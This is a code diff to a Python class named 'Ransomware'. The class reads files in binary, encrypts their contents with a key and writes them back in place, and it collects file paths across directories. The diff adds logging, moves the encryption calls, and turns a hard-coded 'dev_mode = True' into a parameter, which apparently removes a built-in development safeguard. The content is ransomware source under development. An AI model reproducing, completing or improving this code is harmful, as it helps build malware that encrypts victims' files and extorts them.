@@ -1,5 +1,6 @@
 import os
 import os.path
+import logging
 from os import listdir
 from os.path import isfile, join
 
@@ -14,12 +15,12 @@ In here you'll find the individual ciphers implemented together, encryption/decr
 Debug messages along with any code that doesn't work/isn't being used has been commented out
 
 '''
-
 class Ransomware(object):
 
     def __init__(self, key, dev_mode):
         self.key = key
-        self.dev_mode = True
+        self.dev_mode = dev_mode
+        logging.basicConfig(level=logging.INFO)
 
 
     ######## Encryption functions ######## 
@@ -41,8 +42,8 @@ class Ransomware(object):
         # Open file as Read-Binary, read its contents and store in f_contents
         with open(filename, 'rb') as f:
             f_contents = f.read()
-        encrypted_contents = self.perform_encryption(self.key, f_contents)
-        f.close()
+            encrypted_contents = self.perform_encryption(self.key, f_contents)
+            f.close()
 
         # Save encrypted contents to file
         with open(filename, 'wb') as f:
@@ -112,5 +113,3 @@ class Ransomware(object):
             for filename in files:
                 list_of_files.append(directory + "\\" + filename)       
         return list_of_files
-
-        if __name__ == '__main__':self.main()
